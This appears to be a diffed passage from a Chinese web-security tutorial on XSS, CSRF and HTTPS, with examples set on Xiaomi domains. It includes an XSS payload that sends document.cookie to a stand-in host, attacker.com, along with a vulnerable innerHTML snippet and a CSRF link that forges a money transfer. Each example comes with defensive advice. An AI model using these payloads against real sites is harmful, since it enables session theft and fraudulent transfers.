 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//support.kefu.mi.com?msg=</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> i=<span class="keyword">new</span> Image;</span><br><span class="line">i.src=<span class="string">"http://attacker.com/"</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 <p>显示页面如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=<span class="string">"msg"</span> type=<span class="string">"text"</span> value=<span class="string">"$&#123;msg&#125;"</span> /&gt;</span><br><span class="line">&lt;div id=<span class="string">"show"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">var</span> msg = <span class="built_in">document</span>.getElementById(<span class="string">"msg"</span>); </span><br><span class="line"><span class="keyword">var</span> show = <span class="built_in">document</span>.getElementById(<span class="string">"show"</span>);</span><br><span class="line">show.innerHTML = msg.value;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=<span class="string">"msg"</span> type=<span class="string">"text"</span> value=<span class="string">"$&#123;msg&#125;"</span> /&gt;</span><br><span class="line">&lt;div id=<span class="string">"show"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">var</span> msg = <span class="built_in">document</span>.getElementById(<span class="string">"msg"</span>); </span><br><span class="line"><span class="keyword">var</span> show = <span class="built_in">document</span>.getElementById(<span class="string">"show"</span>);</span><br><span class="line">show.innerHTML = msg.value;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 <p>防御XSS最佳的做法是对数据进行严格的输出编码，使得攻击者提供的数据不再被浏览器认为是脚本而被误执行。</p>
 <h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>CSRF称为跨站请求伪造，全称是Cross Site Request Forgery，它可以在受害者毫不知情的情况下，以受害者的名义伪造请求发送给受攻击站点。</p>
 <p>场景说明：小米金融网站A，有一个如下的转账接口</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//jr.mi.com/transfer?to=dongqingqing&amp;money=1000000000000</span></span><br></pre></td></tr></table></figure>
 <p>黑客H有一个网站B，在网站中放入如下代码，通过广告诱使受害者点击。如果受害者之前登录过网站A，且session还未过期，就会在受害者不知情的情况下，成功转账给黑客。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">'http://jr.mi.com/transfer?to=dongqingqing&amp;money=1000000000000'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">'http://jr.mi.com/transfer?to=dongqingqing&amp;money=1000000000000'</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
 <p>可以通过验证HTTP Referer字段、在请求地址中添加token并验证、在HTTP头中自定义属性并验证等方法进行解决；</p>
 <h4 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h4><p>建议所有对外网开放的站点都通过HTTPS，它是在HTTP协议的基础上，加入了SSL层，对数据进行加密处理。</p>
 <p>通过HTTPS协议，cookie在传输的过程中，即使被别人劫持到请求，也不知道实际的cookie是什么，无法伪造其他的请求。</p>
